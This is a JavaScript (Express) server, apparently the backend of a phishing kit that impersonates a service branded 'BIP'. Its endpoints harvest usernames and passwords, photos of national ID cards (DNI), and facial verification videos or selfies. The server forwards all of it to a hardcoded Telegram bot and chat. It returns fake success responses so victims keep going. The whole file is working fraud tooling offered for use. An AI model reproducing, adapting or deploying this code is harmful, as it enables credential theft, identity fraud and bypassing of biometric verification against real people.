// Servidor simple para capturar datos y enviar a Telegram
const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

// Configuración Telegram
const TELEGRAM_BOT_TOKEN = '8094708506:AAFnHbREy8M_7Zj1doPqNxl0RtNnnObr-KY';
const TELEGRAM_CHAT_ID = '8523843948';

// Middleware
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Función para enviar a Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('✅ Mensaje enviado a Telegram');
    return true;
  } catch (error) {
    console.error('❌ Error Telegram:', error.message);
    return false;
  }
}

// Función para enviar foto a Telegram
async function sendPhotoToTelegram(photoBase64, caption) {
  try {
    const base64Data = photoBase64.includes(',') ? photoBase64.split(',')[1] : photoBase64;
    const buffer = Buffer.from(base64Data, 'base64');
    
    const FormData = require('form-data');
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('photo', buffer, { filename: 'photo.jpg' });
    form.append('caption', caption);
    
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, form, {
      headers: form.getHeaders()
    });
    console.log('✅ Foto enviada a Telegram');
    return true;
  } catch (error) {
    console.error('❌ Error enviando foto:', error.message);
    return false;
  }
}

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// LOGIN - Captura usuario y contraseña
app.post('/api/auth/login', async (req, res) => {
  const { username, password } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.ip || 'N/A';
  const userAgent = req.headers['user-agent'] || 'N/A';
  
  console.log('📥 LOGIN recibido:', username);
  
  const message = `
🔐 <b>NUEVO LOGIN - BIP</b>

👤 <b>Usuario:</b> <code>${username}</code>
🔑 <b>Contraseña:</b> <code>${password}</code>

🌐 <b>IP:</b> ${ip}
📱 <b>Dispositivo:</b> ${userAgent.substring(0, 100)}
🕐 <b>Fecha:</b> ${new Date().toLocaleString('es-AR')}
`;

  await sendToTelegram(message);
  
  // Siempre responder éxito
  res.json({
    token: 'jwt-token-' + Date.now(),
    user: {
      id: Date.now().toString(),
      username: username,
      name: username,
      email: username + '@bip.com'
    }
  });
});

// DNI - Captura fotos del DNI
app.post('/api/verification/dni', async (req, res) => {
  const { frontImage, backImage } = req.body;
  
  console.log('📥 DNI recibido');
  console.log('   Frente:', frontImage ? frontImage.length + ' chars' : 'NO');
  console.log('   Dorso:', backImage ? backImage.length + ' chars' : 'NO');
  
  await sendToTelegram(`📄 <b>DNI RECIBIDO</b>\n\n🕐 ${new Date().toLocaleString('es-AR')}`);
  
  // Enviar fotos
  if (frontImage) {
    await sendPhotoToTelegram(frontImage, '📄 DNI - FRENTE');
  }
  if (backImage) {
    await sendPhotoToTelegram(backImage, '📄 DNI - DORSO');
  }
  
  res.json({ success: true, message: 'DNI verificado' });
});

// FACIAL - Captura video/fotos faciales
app.post('/api/verification/facial', async (req, res) => {
  const { faceVideo, faceImage, facePhotos } = req.body;
  
  console.log('📥 FACIAL recibido');
  console.log('   Video:', faceVideo ? (faceVideo.length / 1024).toFixed(1) + ' KB (base64)' : 'NO');
  console.log('   Imagen:', faceImage ? (faceImage.length / 1024).toFixed(1) + ' KB' : 'NO');
  console.log('   Fotos múltiples:', facePhotos ? facePhotos.length + ' fotos' : 'NO');
  
  // Responder inmediatamente para no bloquear al usuario
  res.json({ success: true, message: 'Verificación facial completada' });
  
  // Procesar en background
  (async () => {
    try {
      // Si hay video, enviarlo
      if (faceVideo && faceVideo.length > 100) {
        console.log('📹 Procesando video webm...');
        
        // Limpiar el base64 - remover el prefijo data:video/webm;base64,
        let base64Data = faceVideo;
        if (base64Data.includes(',')) {
          base64Data = base64Data.split(',')[1];
        }
        // Limpiar espacios y saltos de línea
        base64Data = base64Data.replace(/\s/g, '');
        
        try {
          const buffer = Buffer.from(base64Data, 'base64');
          const sizeMB = (buffer.length / (1024 * 1024)).toFixed(2);
          console.log(`📹 Video decodificado: ${sizeMB} MB (${buffer.length} bytes)`);
          
          if (buffer.length < 1000) {
            console.log('⚠️ Buffer muy pequeño, posible error de decodificación');
            await sendToTelegram(`⚠️ Video facial recibido pero muy pequeño (${buffer.length} bytes)`);
            return;
          }
          
          await sendToTelegram(`📹 <b>VIDEO FACIAL RECIBIDO</b>\n📏 Tamaño: ${sizeMB} MB\n🕐 ${new Date().toLocaleString('es-AR')}\n\n⏳ Enviando archivo...`);
          
          const FormData = require('form-data');
          const form = new FormData();
          form.append('chat_id', TELEGRAM_CHAT_ID);
          form.append('document', buffer, { 
            filename: `verificacion_facial_${Date.now()}.webm`,
            contentType: 'video/webm'
          });
          form.append('caption', `👤 Video Verificación Facial - ${sizeMB} MB`);
          
          console.log('📤 Enviando a Telegram...');
          const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, 
            form, 
            {
              headers: form.getHeaders(),
              maxContentLength: 100 * 1024 * 1024,
              maxBodyLength: 100 * 1024 * 1024,
              timeout: 180000 // 3 minutos
            }
          );
          
          if (response.data && response.data.ok) {
            console.log('✅ Video enviado correctamente a Telegram');
          } else {
            console.log('⚠️ Respuesta de Telegram:', JSON.stringify(response.data));
          }
        } catch (videoError) {
          console.error('❌ Error procesando/enviando video:', videoError.message);
          if (videoError.response) {
            console.error('   Respuesta:', JSON.stringify(videoError.response.data));
          }
          await sendToTelegram(`❌ Error enviando video: ${videoError.message}`);
        }
      }
      // Enviar fotos múltiples si existen
      else if (facePhotos && facePhotos.length > 0) {
        await sendToTelegram(`📸 <b>FOTOS FACIALES</b>\n📊 Cantidad: ${facePhotos.length}\n🕐 ${new Date().toLocaleString('es-AR')}`);
        
        for (let i = 0; i < facePhotos.length; i++) {
          try {
            await sendPhotoToTelegram(facePhotos[i], `👤 Foto Facial ${i + 1}/${facePhotos.length}`);
            if (i < facePhotos.length - 1) {
              await new Promise(resolve => setTimeout(resolve, 300));
            }
          } catch (error) {
            console.log(`⚠️ Error enviando foto ${i + 1}:`, error.message);
          }
        }
      }
      // Si hay imagen única
      else if (faceImage) {
        await sendToTelegram(`📸 <b>FOTO FACIAL</b>\n🕐 ${new Date().toLocaleString('es-AR')}`);
        try {
          await sendPhotoToTelegram(faceImage, '👤 Foto Verificación Facial');
        } catch (error) {
          console.log('⚠️ Error enviando foto:', error.message);
        }
      } else {
        console.log('⚠️ No se recibió ningún dato válido de verificación facial');
      }
    } catch (error) {
      console.error('❌ Error general en facial:', error.message);
    }
  })();
});

// Iniciar servidor
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor corriendo en http://0.0.0.0:${PORT}`);
  console.log(`📱 Telegram configurado: ${TELEGRAM_CHAT_ID}`);
  
  // Test de conexión a Telegram
  sendToTelegram('🟢 <b>Servidor BIP iniciado</b>\n\n' + new Date().toLocaleString('es-AR'));
});

// Mantener vivo
process.on('uncaughtException', (err) => {
  console.error('Error no capturado:', err);
});

process.on('unhandledRejection', (err) => {
  console.error('Promesa rechazada:', err);
});
